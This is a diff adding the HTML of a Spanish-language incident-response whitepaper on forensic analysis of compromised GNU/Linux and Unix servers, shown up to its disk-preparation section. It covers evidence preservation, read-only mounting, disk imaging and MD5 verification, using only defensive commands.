@@ -1,0 +1,1931 @@
+<html><head><meta content="text/html; charset=ISO-8859-1" http-equiv="Content-Type"><title>Análisis Forense de Sistemas GNU/Linux, Unix</title><meta name="generator" content="DocBook XSL Stylesheets V1.50.0"></head><body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF"><div class="article"><div class="titlepage"><div><h1 class="title"><a name="id2752674"></a>Análisis Forense de Sistemas GNU/Linux, Unix</h1></div><div><div class="author"><h3 class="author">David Dittrich</h3><div class="affiliation"><div class="address"><p>dittrich@cac.washington.edu</p></div></div></div></div><div><div class="author"><h3 class="author">Ervin Sarkisov</h3><div class="affiliation"><div class="address"><p>ervin.sarkisov@hispalinux.es</p></div></div></div></div><div><div class="legalnotice"><p>Copyright David Dittrich, Ervin Sarkisov. Se otorga  permiso para copiar, distribuir y/o modificar este documento bajo los  términos de la Licencia de Documentación Libre GNU, Versión 1.1 o  cualquier otra versión posterior publicada por la Free Software  Foundation. Puede consultar una copia de la licencia en:  <a href="http://www.gnu.org/copyleft/fdl.html" target="_top">http://www.gnu.org/copyleft/fdl.html</a>
+</p></div></div><div><div class="abstract"><p class="title"><b>Resumen</b></p><p>Miles servidores corporativos están siendo comprometidos  diariamente, Gbytes de información privilegiada se transfieren cada  día por los los canales de comunicación, las corporaciones informan de  miles y millones de pérdidas.  </p><p>
+La mayoría de las investigaciones de casos similares, estén realizadas  por parte de las empresas especializadas o por parte de las agencias  gubernamentales, precisan un estudio forense previo para recoger todas  las pruebas encontradas en los equipos y determinar los factores  claves para reconstruir los hechos transcurridos, antes, durante y a  posteriori del posible acceso no autorizado al sistema.    Todo ese trabajo puede ser complicado por múltiples razones, siendo  una analogía directa la ciencia forense tradicional en los casos  criminales, dónde la escena del crimen es el servidor comprometido y  cualquier equivocación o descuido puede causar la pérdida de  información vital que podría desvelar algún hecho importante sobre el  &quot;la víctima&quot;, el &quot;criminal&quot;, el &quot;objetivo&quot; o el &quot;móvil&quot;.  </p><p>
+Los intrusos permanentemente mejoran sus técnicas, sean de acceso,  ocultación de pruebas o de eliminación de huellas, siendo difícil, o  en algunos casos imposible de reconstruir el 100% de los eventos  ocurridos.  Los forenses de hace varios años tienen dificultades  adaptándose a las nuevas técnicas ya que no solo son necesarios los  conocimientos de la materia sino experiencia en campos que tienen  bastante poco que ver con la ciencia forense - ingeniería inversa,  criptografía, programación en lenguajes de bajo nivel.  </p><p>
+Este artículo incluye descripción básica que permitirá al público  general conocer el alcance y supuestos de ciencia informática forense,  sus técnicas que podrán ser presentadas mejor a partir de un caso  práctico de investigación. También estarán cubiertos temas como  protección / des-protección de binarios cifrados bajo GNU/Linux,  técnicas de realización de copias de seguridad byte por byte,  sistemas de ficheros loopback y utilización de la herramienta  universal del investigador forense informático TCT.</p></div></div><hr></div><div class="toc"><p><b>Tabla de contenidos</b></p><dl><dt>1. <a href="#id2751073">Introducción </a></dt><dd><dl><dt>1.1. <a href="#id2754723">Organización del Documento </a></dt><dt>1.2. <a href="#id2754397">Objetivos </a></dt><dt>1.3. <a href="#id2754442">Alcance y Supuestos </a></dt><dt>1.4. <a href="#id2755270">Indicaciones </a></dt><dt>1.5. <a href="#id2755355">Equipo Necesario </a></dt></dl></dd><dt>2. <a href="#id2755563">Objetivos Tácticos/Estratégicos </a></dt><dt>3. <a href="#id2755704">Congelación de la Escena del Crimen </a></dt><dt>4. <a href="#id2755958">Problemas con Recolección de Información </a></dt><dt>5. <a href="#id2756075">Almacenamiento de Pruebas </a></dt><dt>6. <a href="#id2756184">Preparación para el Análisis </a></dt><dt>7. <a href="#id2757030">Análisis con Herramientas Estándar de Unix </a></dt><dt>8. <a href="#id2757491">The Coroner's Toolkit </a></dt><dt>9. <a href="#id2757604">Usando TCT </a></dt><dt>10. <a href="#id2757994">Ejemplo de Informe de Pruebas Encontradas </a></dt><dt>11. <a href="#id2759274">Apéndice A - Métodos de Protección de Binarios </a></dt><dd><dl><dt>11.1. <a href="#id2759281">Introducción </a></dt><dt>11.2. <a href="#id2759388">Métodos de Protección </a></dt></dl></dd><dt>12. <a href="#id2759782">Apéndice B - Sistema de Ficheros Loopback de Linux </a></dt><dd><dl><dt>12.1. <a href="#id2759987">Conclusiones </a></dt></dl></dd><dt>13. <a href="#id2760015">Referencias </a></dt><dt>14. <a href="#id2760628">Agradecimientos </a></dt></dl></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2751073"></a>1. Introducción </h2></div></div><p>
+La ciencia forense es metódica y se basa en acciones premeditadas para reunir
+pruebas y analizarlas. La tecnología, en caso de análisis forense en sistemas
+informáticos, son aplicaciones que hacen un papel importante en reunir la
+información y pruebas necesarias. La escena del crimen es el ordenador y la
+red a la cual éste está conectado.
+</p><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2754723"></a>1.1. Organización del Documento </h3></div></div><p>
+El documento pretende dar una vista global del trabajo de los analístas forenses 
+en los entornos GNU/Linux y iniciar a los administradores de sistemas en el mundo de
+ciencia forense informática a través de conceptos teóricos, procedimientos pre-establecidos
+de tratamiento de información y casos prácticos. El documento también indica
+la manera de montar un laboratorio forense, el equipo necesario, configuración de
+hardware y de software.
+</p><p>
+A lo largo del trayecto trazado por este whitepaper se dará a conocer la problemática
+de algunos aspectos del análisis como congelación de la escena del crimen, 
+preparación y análisis a través de herramientas comúnes de GNU/Linux y con
+utilidades específicas como TCT, TASK, etc. Se mencionarán técnicas de duplicación
+de sistema de ficheros y su montura en loopback y análisis.
+</p><p>
+Teniendo en cuenta que cada día los intrusos utilizan técnicas más y más avanzadas
+de protección de sus herramientas, también cubriremos el tema de ocultación de 
+propósito de los binarios ELF a través de cifrado y ofuscación con Burneye y/o
+otras utilidades.
+</p></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2754397"></a>1.2. Objetivos </h3></div></div><p>
+El objetivo de un análisis forense informático es realizar un proceso de
+búsqueda detallada para reconstruir a través de todos los medios el log de
+acontecimientos que tuvieron lugar desde el momento cuando el sistema estuvo
+en su estado integro hasta el momento de detección de un acceso no autorizado.
+</p><p>
+Esa tarea debe ser llevada acabo con máxima cautela, asegurándose que se
+conserva intacta, a la mayor medida posible, la información contenida en el
+disco de un sistema comprometido, de forma similar que los investigadores
+policiales intentan mantener la escena del crimen intacta, hasta que se
+recogen todas las pruebas posibles.
+</p><p>
+El trabajo de un investigador forense es necesario para ofrecer un punto de
+partida fundamental para los investigadores policiales, ofreciéndoles
+pistas sólidas, así como pruebas para su uso posterior.
+</p></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2754442"></a>1.3. Alcance y Supuestos </h3></div></div><p>
+Cada uno de los incidentes es único, por lo tanto, la involucraron de un
+investigador forense externo es diferente en cada caso. Algunas veces el
+trabajo puede estar limitado a colaborar con las agencias del gobierno como
+Departamento de Delitos Telemáticos de Guardia Civil y/o Brigada Investigación
+Tecnológica, proporcionándoles el equipo íntegro para que sea analizado en sus
+instalaciones y por sus expertos.
+</p><p>
+Otras veces será necesario previamente realizar una recolección de información
+del sistema informático: analizar ficheros log, estudiar el sistema de
+ficheros (FS) del equipo comprometido y reconstruir la secuencia de eventos
+para tener una imagen clara y global del incidente.
+</p><p>
+El análisis termina cuando el forense tiene conocimiento de como se produjo el
+compromiso (1), bajo que circunstancias (2), la identidad de posible/s
+atacador/es (3), su procedencia y origen (4), fechas de compromiso (5),
+objetivos del/los atacador/es (6) así como, cuando ha sido reconstruida
+completamente la secuencia temporal de los eventos (7).
+</p><p>
+Cuando un investigador forense empieza el análisis de la situación nunca sabe
+con lo que va a enfrentarse. Al principio puede ser que no encuentre a simple
+vista ninguna huella ni prueba de que el equipo ha sido violado,
+especialmente si hay un &quot;rootkit&quot; [1] instalado en la máquina. Puede encontrar
+procesos extraños ejecutándose con puertos abiertos. También es frecuente que
+vea una partición ocupada 100% de su capacidad, pero cuando la verifica a
+través de du, el sistema muestra otro porcentaje de ocupación. Puede encontrar
+una saturación de tráfico de red desde un host específico. Es posible
+encontrar aplicaciones que están consumiendo un porcentaje elevado de del CPU
+pero no haya ningún indicio de un programa con ese nombre en el sistema de
+ficheros.
+</p><p>
+Los pasos para empezar la investigación de un incidente son diferentes en cada
+caso. El investigador debe tomar decisiones basándose en su experiencia y el
+&quot;sexto sentido&quot; para llegar al fondo del asunto. No es necesario seguir pasos
+determinados, ni su orden es importante a veces.
+</p><p>
+Puede que algunos pasos básicos sean más de lo que hace falta y también puede
+ser que estos sean insuficientes para solucionar el problema. Los pasos
+básicos pueden concluir en localizar todas las huellas y eventos que se
+produjeron.
+</p><p>
+Y en supuestos los pasos básicos no han desvelado la situación, se debe
+recurrir a llevar acabo un análisis profundo o de-compilación de las
+aplicaciones encontradas durante la búsqueda. Estas aplicaciones pueden ser
+escritas totalmente desde cero y protegidas, pero en la mayoría de los casos
+son aplicaciones utilizadas de forma común, que circulan por la red, estén o
+no estén protegidas. Cuando hablamos de protección de ficheros podemos hablar
+sobre técnicas de confusión, ofuscación y compresión (Ver apéndice A para
+detalles).
+</p></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2755270"></a>1.4. Indicaciones </h3></div></div><p>
+En vez de utilizar &quot;a rajatabla&quot; el orden de los procedimientos que fueron
+establecidos por otros analistas forenses, se debe considerarlos como recursos
+y el orden necesario en cada caso puede variar. Una vez aprendidas técnicas
+generales, se podrá combinarlos con la experiencia y crear sus propios trucos
+en un futuro. Es como ser un cocinero que utiliza el libro de recetas para
+preparar sus platos, y con experiencia modifica las recetas para obtener un
+plato único.
+</p><p>
+La persona que ha descubierto el incidente debe asegurarse que hay máxima
+información intacta posible para que el investigador forense pueda realizar su
+trabajo con éxito, ya que la información encontrada dentro del sistema
+registra la historia real de lo que ha sucedido.
+</p><p>
+Hay solo una única cosa que es común para cada investigación forense, y no es
+suficiente repetirla siempre. Se debe tener a mano un cuaderno y un bolígrafo
+para apuntar inmediatamente todos los pasos que efectúa durante el proceso de
+investigación. También se debe recordar (y apuntar) que los pasos para
+preservar y reunir las evidencias deben ser efectuadas con lentitud,
+precaución, metódica y pensándolo dos veces antes de hacer cualquier cosa ya
+que cualquier error puede llevar consigo consecuencias como pérdida de
+pruebas.
+</p><p>
+Tener el cuaderno con las notas a mano puede ser necesario para refrescar la 
+memoria varios meses después de la investigación cuando llegue la hora de 
+testificar en una sala de juicio (si el caso llega a estos extremos).
+</p><p>
+Las notas también ayudarán a calcular de forma más precisa las pérdidas
+sufridas por la empresa, evitando estimaciones exageradas que suelen
+producirse durante los casos criminales por parte de empresas afectadas,
+abogados e otros terceros.
+</p></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2755355"></a>1.5. Equipo Necesario </h3></div></div><p>
+Aunque existan distribuciones de Linux que incorporan directamente utilidades
+forenses en su instalación, se utilizó la distro que no las incorporaba ya que
+la instalación de estas herramientas por defecto a veces causa problemas.
+Mientras que si se utiliza cualquier distro como RedHat, Debian el analista
+puede configurar el software según sus preferencias.
+</p><p>
+Referente a las técnicas de análisis forense descritas a continuación asumo
+que utiliza un sistema operativo RedHat Linux i386 sobre cualquier
+placa madre compatible con Intel. Estas técnicas son casi idénticas para
+cualquiera de las versiones o distribuciones de GNU/Linux ó Unix, pero algunas
+características de i386 pueden variar de un servidor a otro (ejemplo:
+utilización de controladores IDE, limitaciones de PC BIOS, etc...). Consulte
+manuales de administración y seguridad de sistema de su distribución de
+GNU/Linux.
+</p><p>
+<span class="bold"><b>Equipo Principal</b></span> - Es preciso tener un sistema dedicado, propio para
+poder hacer el análisis, sin tener interrupciones por procesos de otros
+usuarios ni estar vulnerable a los &quot;ataques de limpieza&quot; [2]. Un ejemplo de
+configuración de un laboratorio forense puede ser siguiente:
+</p><div class="itemizedlist"><ul type="disc"><li><p>Un equipo con una placa compatible i386 con 2 tarjetas controladoras IDE.</p></li><li><p>Por lo menos 2 discos duros &gt; 8Gb. sobre el controlador IDE    principal (para almacenar el sistema operativo y herramientas, más    espacio para poder copiar las particiones salvadas desde la cinta, y    espacio adicional para recuperar la información borrada desde discos    duros).</p></li><li><p>Un segundo controlador IDE sin utilizar. Eso significa que no deberá    mezclarse con modificación de configuraciones de hardware de los    discos. Simplemente enchufelos y aparecerán como /dev/hdc (master) ó    /dev/hdd (slave).</p></li><li><p>Tarjeta de interfaz SCSI (e.g., Adaptec 1542)</p></li><li><p>Dispositivos de cinta DDS-3 ó DDS-4 4mm (se necesita bastante    capacidad para almacenar información de las particiones grandes.). </p></li><li><p>Si el sistema está conectado a una red, deberá ser perfectamente    parcheado y no tener ningún servicio de red funcionando salvo SSH    (para acceso remoto y transferencia de ficheros). RedHat Linux 7.3    con Bastille Linux 2.0 BETA es muy buena opción (Combinación    utilizada en el lab de Activa Link).</p></li></ul></div><p>
+Equipo Móvil - Otro sistema de análisis es un nuevo portátil. El buen
+método de llevar el laboratorio hasta el sistema accidentado es un
+portátil con tarjeta eth 10/100, disco duro de más de 18-20 Gb -
+suficiente espacio que permitirá almacenar toda la información de
+imágenes del sistema de ficheros (estas imágenes deberían luego
+almacenarse en cintas) para ser analizadas, visualizar los
+resultados, craquear las contraseñas crypt() del intruso que puede
+posiblemente encontrar, y una mochila.
+</p><p>
+Un cable 10Base-T normal y uno cruzado permitirá conectarse con un
+hub, switch, o directamente al &quot;cadáver&quot; y todavía utilizar la red para
+comunicarse con el sistema víctima sobre una mini-red aislada de 2
+estaciones de trabajo. Para ello necesitará establecer una ruta
+estática en la tabla de rutas, o configurar reglas de bridging (será más
+fácil si se desconecta la máquina hackeada del resto de la red).
+</p><p>
+Un equipo de análisis, funcionando bajo GNU/Linux será suficiente para
+analizar sistemas de ficheros diferentes pero soportados como por
+ejemplo Sun UFS. Se podrá simplemente montar el sistema de fichero
+emitiendo el comando mount con la opción particular (ver página man
+del mount).
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ [root@quest.activalink.com]# mount -r -t ufs -o ufstype=sun /dev/hdd2 /mnt
+</pre><p>
+Otra ventaja de GNU/Linux para investigadores forenses es la capacidad del
+interfaz &quot;loopback&quot;, que permite montar un fichero que contiene una imagen del
+disco (obtenida con dd) dentro del sistema de ficheros de la estación
+de análisis (Ver el apéndice B para detalles).
+</p></div></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2755563"></a>2. Objetivos Tácticos/Estratégicos </h2></div></div><p>
+El objetivo principal de un investigador forense es identificar a
+todos los sistemas controlados por el intruso, comprender los métodos
+utilizados para acceder a estos sistemas, los objetivos del intruso y
+la actividad que ha desempeñado durante su estancia dentro del sistema
+comprometido. La información obtenida tiene que ser compartida con el
+resto de los miembros del equipo forense, a fin de evitar la pérdida
+de información. También es el objetivo del investigador la protección
+del estado de sitio contra modificaciones para evitar pérdidas de
+información (pruebas).
+</p><p>
+Posible persecución - es un objetivo secundario, pero como he dicho
+anteriormente, para un investigador forense su trabajo primario es
+preservar lo más íntegramente posible las evidencias del crimen en un
+estado íntegro. Eso significa poner el sistema fuera de servicio
+cuando todo el mundo está presionando para volver a ponerlo on-line.
+</p><p>
+Si el sistema, por parte del administrador, fue forzado a seguir
+funcionando, eliminando las posibles vulnerabilidades o cualquier otra
+supuesta vía de acceso al servidor, la investigación forense no podrá
+seguir el rumbo correcto ya que:
+</p><div class="orderedlist"><ol type="1"><li><p>Se eliminaría cualquier posibilidad de persecución del intruso en un    futuro ya que se modifica la &quot;escena del crimen&quot; y no se podría    calcular los daños estimados con un grado elevado de certeza.</p></li><li><p>Hay muchas posibilidades de que se le paso algo importante por alto    al administrador y el intruso (o intrusos) siguen teniendo acceso al    sistema. Por lo tanto es mejor sufrir un &quot;downtime&quot; de red, mientras    que se realiza el análisis forense del sistema.</p></li></ol></div><p>
+Se tiene que establecer una prioridad entre: 
+</p><div class="orderedlist"><ol type="1"><li><p>Funcionamiento inmediato, teniendo presente que las huellas dejadas    por el/los intruso/s pueden haberse eliminado por descuido del    administrador y su equipo, y que el servidor puede seguir teniendo    puertas traseras bien ocultas. Esta opción permite estar operativo    en poco tiempo.</p></li><li><p>Investigación forense detallada que permite conseguir los objetivos    mencionados en la sección 1a del capítulo Introducción, asegurarse    100% de que el equipo está seguro y recoger pruebas suficientes para    poder iniciar el trámite legal. Esta opción supone un mayor tiempo    de permanencia off-line si no existen planes de contingencia y    procedimientos para la recuperación del servicio.</p></li></ol></div><p>
+Asumiendo que el análisis es una prioridad, ¿cuáles son los siguientes pasos?
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2755704"></a>3. Congelación de la Escena del Crimen </h2></div></div><p>
+Una vez que el Administrador del sistema tenga sospechas de que
+su sistema haya sido violado, y que no existan pruebas que indiquen lo contrario
+como por ejemplo resultados de chequeos de integridad realizados por 
+por alguna herramienta como Tripwire o
+AIDE (Advanced Intrusion Detection Environment), tiene
+que considerar que efectivamente el sistema ha sido violado. Desde aquél
+momento, es necesario tener máximo cuidado para evitar que se produzca
+cualquier alteración de la &quot;escena del crimen&quot;.
+</p><p>
+Hay varios tipos de pruebas que oculta el sistema, con diferentes
+niveles de volatilidad, en lugares como registros del procesador,
+estructura de datos en la memoria, swap, estructuras de datos de red,
+contadores, procesos de usuario en memoria y stacks, cache del file
+system, el file system y etc.
+</p><p>
+Será muy difícil o casi imposible de reunir toda esa información en el
+preciso momento que el intruso está operando, por lo tanto necesitamos
+prescindir de ella y reunir aquella información, que se recoge con
+mayor facilidad antes de llegada de un especialista forense que
+determinará el método de entrada, actividad de intrusos, identidad y
+origen de intrusos, duración de compromiso, posiblemente lo bastante
+para localizarles). En otras palabras ¿Cómo? ¿Qué? ¿Quién? ¿De dónde?
+¿Cuando?
+</p><p>
+La opción más fácil es de evitar que las cosas no cambien - cerrar el
+sistema o suspender su funcionamiento.
+</p><p>
+Normalmente los sistemas Unix se cierran con el comando shutdown. Eso
+se hace para asegurarse que todos los servicios han finalizado de
+forma limpia, todos los ficheros cache y buffers de sistemas están
+flusheados y los usuarios están notificados. Este procedimiento es
+perfecto para sistemas intactos, pero en un sistema afectado,
+esa acción, lo más seguro que borre alguna información de interés. 
+Hubo casos cuando los intrusos programaban sistemas para
+eliminar algunos ficheros en la máquina cuando el interfaz de red se
+deshabilitase ( es decir, cuando el cable de conexión haya sido desconectado) 
+o cuando el procedimiento de un shutdown normal haya sido
+activado.
+</p><p>
+Para prevenir esas modificaciones del sistema de ficheros es mejor
+sacar el cable de electricidad del enchufe (Sí, sí, lo has leído
+bien). Hay que estar informados que puede ser que alguna información
+en la memoria o información del cache no guardada en el disco puede
+ser eliminada como estado de red, procesos ejecutándose en la memoria,
+accesos a memoria kernel, contenido de registros swap, etc.
+</p><p>
+Para ello antes de sacar el cable del enchufe puede hacer lo
+siguiente; ejecutar varios comandos antes de apagar de forma &quot;bruta&quot;
+el sistema. Se debe hacerlo en una sesión script (ver man del comando
+script).
+</p><p>
+Importante: Si el administrador no está seguro de lo que está
+haciendo, se debe simplemente desenchufar el sistema y ponerse en
+contacto con un investigador forense especializado, ya que las pruebas
+pueden ser dañadas con mucha facilidad.
+</p><p>
+En caso de que el administrador esté seguro de si mismo puede utilizar
+algunas de las herramientas que vienen a continuación, siempre con
+cuidado.
+</p><div class="itemizedlist"><ul type="disc"><li><p>last, w, who - Obtener el listado de usuarios actuales en el sistema,   logins anteriores, etc.</p></li><li><p>ls - Obtener el listado largo (ls -lat) de ficheros en lugares   sospechosos, los home directories, directorio /dev, directorio /root,   etc.</p></li><li><p>ps - Obtener el listado largo de todos los procesos incluidos   aquellos sin ttys (e.g., ps auxwww y ps elfwww -- añadir más flags w   si el listado se acorta).</p></li><li><p>lsof - Obtener un listado completo de descriptores de ficheros, que   puede mostrar algunos backdoors, sniffers, eggdrop IRC bots,   redireccionadores de puertos para VNC, etc.(Ojo con cwd, cual es el   directorio local en el cual el programa ha sido ejecutado.)</p></li><li><p>find - Identificar todos ficheros corrientes, directorios modificados   desde la fecha de último acceso no autorizado, o que pertenecen al   usuario desde cuya cuenta se sospecha que fue originado el ataque.  </p><p>
+ Importante: La utilidad &quot;find&quot; modifica el i-node &quot;last accessed&quot; con   el timestamp actual, entonces no debe utilizar esta utilidad para   barrer el sistema de ficheros, si todavía quiere saber cuales son los   ficheros accedidos por el atacante si el sistema de ficheros está   montado en modo lectura y escritura.</p></li><li><p>ltrace, strace, truss (SunOS 5) - Ver últimos accesos a ficheros de   configuración de &quot;rootkit&quot;, ejemplo: Examinar el fichero /bin/ls   trucado.</p></li></ul></div><p>
+Ejemplo:
+</p><pre class="programlisting">
+ [sonne@thor.activalink.com]# truss -t open ./ls
+      open(&quot;/dev/zero&quot;, O_RDONLY)                       = 3
+      open(&quot;/usr/lib/libc.so.1&quot;, O_RDONLY)            = 4
+      open(&quot;/usr/lib/libdl.so.1&quot;, O_RDONLY)           = 4
+      open(&quot;/usr/platform/SUNW,Sun_4_75/lib/libc_psr.so.1&quot;, O_RDONLY) Err#2 ENOENT
+ ---&gt; open(&quot;/dev/ptyr&quot;, O_RDONLY)                     Err#2 ENOENT
+      open(&quot;.&quot;, O_RDONLY|O_NDELAY)             = 3
+      [list of files]
+</pre><p>
+Ver páginas man de cada una de las utilidades para conocer sus funciones.
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2755958"></a>4. Problemas con Recolección de Información </h2></div></div><p>
+Un sistema informático no sólo puede ser instruido para
+auto-destruirse una vez se produzcan las condiciones de riesgo
+consideradas por el intruso, sino también realizar tareas programadas
+de eliminación, sustitución de ficheros y ejecuciones de aplicaciones
+determinadas.
+</p><p>
+Es muy frecuente encontrar los comandos de sistema, módulos de kernel
+cargables (LKM), librerías dinámicas y etc modificados o reemplazados
+por la voluntad del intruso. Bajo estas circunstancias eso puede
+obligar a que el sistema operativo &quot;mintiese&quot;. Examinando en este caso
+el estado del servidor, todo aparenta estar en orden, pero en realidad el
+sistema está totalmente manipulado con cuatro, cinco... diez
+diferentes &quot;back-doors&quot; para permitir al hacker el fácil acceso al
+servidor en un futuro, teniendo instalado un &quot;root kit&quot; [10].
+</p><p>
+Si no hay seguridad de que las utilidades comunes estén mostrando la
+verdadera situación, se debe utilizar aplicaciones alternativas.
+Los módulos de kernel cargables (LKM) o librerías dinámicas, 
+pueden estar alteradas para proporcionar información falsa.
+En estos casos se debe utilizar binarios compilados de forma estática
+desde un toolkit como Fire Biatchux o descargados de la web de
+incident-responce.org.
+</p><p>
+Se debe cuestionar permanentemente la información que el servidor está
+proporcionando.  Sería aconsejable y mucho más fácil y seguro si
+simplemente el disco duro fuese extraído de la máquina afectada y
+fuese montado en modo sólo lectura en una estación de análisis similar
+al servidor atacado.
+</p><p>
+Se debe también considerar montar el disco como noexec y nodev para
+asegurarse que no pueda ser ejecutada ninguna aplicación desde el
+disco duro comprometido y que se ignoren los ficheros de dispositivos
+en el directorio /dev. Es muy aconsejable estudiar bien la página man
+de la utilidad mount.
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # mount -o ro,noexec,nodev /dev/hda1 /t
+</pre><p>
+Si no disponemos de un equipo dedicado para el análisis, ni decidimos
+llevarlo por la vía oficial, pero tenemos el interés de conocer los
+detalles del ataque y el equipo tiene un CD-ROM, existen herramientas
+forenses que permiten el estudio post-mortem &quot;en situ&quot;. Un buen ejemplo de
+herramienta de este tipo es Fire-Biatchux [11] que permite tener de forma
+instantánea un entorno de análisis seguro, proporcionando copias
+íntegras de todos los binarios necesarios de GNU/Linux y Solaris para llevar
+acabo la investigación. La utilización de esa técnica de investigación
+forense sale del entorno de este documento y será cubierta en los papers
+futuros.
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2756075"></a>5. Almacenamiento de Pruebas </h2></div></div><p>
+Una vez el disco ha sido sacado de la máquina, debe ser almacenado de
+forma segura para poder ser utilizado como prueba a posteriori en un
+juicio. Si no se almacena de forma correcta, no será la primera vez que
+la investigación no pueda seguir o las pruebas se declaren nulas por 
+parte de un juez o jurado  por contaminación o tratamiento indebido.
+</p><p>
+Es necesario tomar notas de lo que se hace con el disco duro, y a que
+hora, almacenándolo en una ubicación segura como por ejemplo una caja
+fuerte. Es recomendable que siempre que se trabaje con el medio
+original esté acompañado por un colega, para que conste a los efectos
+legales y su testimonio pueda ser confirmado por alguien con un nivel
+de conocimientos similar.
+</p><p>
+Las copias deben ser hechas bit-por-bit, es decir será necesario hacer
+imágenes del disco. La investigación debe ser llevada sobre una copia
+y nunca sobre el disco original. Se debe hacer tres copias del disco
+duro original. Sobre todas las copias y original se debe llevar acabo
+una verificación criptográfica - un checksum MD5.
+</p><p>
+Creación de imagenes es un método de hacer copias exactas de particiones
+de disco duro. La utilidad que nos permite llevarlo acabo es &quot;dd&quot; (ver la
+página man de la utilidad, y el artículo de Thomas Rude
+[12]). Utilidades como tar y cpio están bien si la portabilidad es lo
+más importante, y dump y restore están perfectas para recuperar
+ficheros individuales en casos de que la consistencia de información
+es lo más importante.
+</p><p>
+Por supuesto, éstas utilidades tienen su sitio merecido, pero a lo que
+se refiere al análisis forense, lo más importante es conservación de
+información. Las utilidades descritas anteriormente no le permiten
+conservar el espacio &quot;slack&quot; al final de los ficheros, ni permiten
+conservar que es lo que exactamente contenían los bloques de los
+ficheros eliminados.  Ya que los intrusos frecuentemente almacenan 
+ficheros en el espacio &quot;slack&quot; de los archivos y borran de forma segura 
+los archivos logs una vez que hayan penetrado en el sistema para 
+ocultar sus huellas.
+</p><p>
+Todas las acciones realizadas durante el análisis deben ser
+documentadas detenidamente. Es fácil hacerlo, si se utiliza el
+programa script, el cual toma nota de toda la entrada y salida del
+shell. Script marca la hora de inicio/fin del log de eventos, y usa el
+comando date varias veces durante la sesión para guardar los tiempos
+intermedios.
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2756184"></a>6. Preparación para el Análisis </h2></div></div><p>
+Esté analizando el sistema con las herramientas forenses específicas o
+no, se debe de seguir los mismos pasos básicos siempre para prepararse
+para el análisis completo del sistema.
+</p><div class="itemizedlist"><ul type="disc"><li><p>En algunos casos es necesario fotografiar el equipo afectado antes    de mover cualquier detalle del mismo. Eso puede ser necesario como    prueba del incidente en casos que posiblemente puedan acabar en una    sala de juicio. En otros casos será necesario documentar los    detalles de todos los componentes del sistema como valores ID de los    dispositivos SCSI, por ejemplo y etc.</p></li><li><p>Empezar haciendo apuntes detallados en el cuaderno. Tener bien    detallados apuntes con la fecha y hora del inicio y fin de cualquier    trabajo realizado será muy útil durante y al final del análisis. Es    importante que todos los hechos pertinentes al caso durante la    preparación, recuperación y análisis de las pruebas sobre un    ataque, estén perfectamente documentados. Estas notas servirán    como base para poder desarrollar un informe detallado de incidencia    que se debe preparar una vez terminado el análisis. Este documento    deberá servir como una prueba del incidente o ataque. Siempre que se    realiza cualquier apunte al cuaderno, el asistente debe tener un \ </p></li></ul></div><pre class="programlisting">
+  completo conocimiento y entendimiento de lo que ha sido apuntado.
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Antes de apagar el sistema, será útil recoger algunos ejemplos de    aquella información que posiblemente no ha sido cambiada por los    intrusos, como la organización de sistema de ficheros de /etc/fstab,    el nombre del host, su dirección IP del fichero /etc/hosts y    información de algunos dispositivos desde los ficheros    /var/log/dmesg o ficheros de log de sistema /var/log/messages. Esa    información normalmente va a caber en un disco 1.44 de forma    comprimida con tar.gz. Si no quiere o no puede extraer esa    información en este paso, en los siguientes pasos eso será más    difícil.</p></li></ul></div><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # cd /
+ # tar -cvzf /dev/fd0 etc/hosts etc/fstab var/log/dmesg var/log/messages
+ etc/hosts
+ etc/fstab
+ var/log/dmesg
+ var/log/messages
+</pre><div class="itemizedlist"><ul type="disc"><li><p>¡Haga 3 imágenes del disco duro entero y trabaje con copias, y no    con el original! En el peor caso que tenga que trabajar con el disco    original correría el riesgo de hacer una pequeña equivocación que    eliminaría las huellas de forma parcial o total. El original debe    ser almacenado en una caja fuerte para estar totalmente seguros que    el contenido del dispositivo no esté alterado o eliminado. Para ello    generaríamos verificaciones de integridad MD5, las imprimiremos en    etiquetas y éstas las pegaremos en el original y en las copias. La    etiqueta del original debe contener la fecha y hora de extracción    del disco del sistema comprometido, y la fecha y hora de    almacenamiento del disco en la caja fuerte. Las etiquetas de las 3    copias deben tener letras de alfabeto griego (como ejemplo). A    continuación están detalladas todas estas tareas:</p></li></ul></div><p>
+a. El disco original debe ser conectado al controladora IDE sin
+utilizar y el sistema debe ser arrancada después. Se debe tener mucho
+cuidado para no dañar el disco en caso de conflictos master-slave en
+el controlador IDE, etc. Es por ello que, insistía anteriormente en
+tener 2 controladoras IDE para evitar este tipo de problemas; es decir
+que es muy conveniente tener un único disco duro conectado a la
+segunda interfaz IDE (si tiene conectado un CD-ROM en la segunda
+interfaz de IDE, se debe quitar de forma temporal).
+</p><p>
+Puede ser que sea necesario modificar las opciones de detección
+automática de la geometría de discos en los ajustes BIOS (Los pasos
+deben ser apuntados siempre para poder volver al estado anterior si se
+comete cualquier error).
+</p><p>
+b. Las particiones del disco duro deben ser identificadas con el
+programa fdisk. Nunca se debe utilizar fdisk en modo interactivo, ya
+que se arriesga que la tabla de particiones existente o las etiquetas
+se modifiquen (fdisk es un programa i386 GNU/Linux, modelado a partir
+de su equivalente de DOS).
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # fdisk -l /dev/hdd
+</pre><pre class="programlisting">
+ Disk /dev/hdd: 255 heads, 63 sectors, 1575 cylinders
+ Units = cylinders of 16065 * 512 bytes
+</pre><pre class="programlisting">
+    Device Boot    Start       End    Blocks   Id  System
+ /dev/hdd1   *         1       869   6980211    b  Win95 FAT32
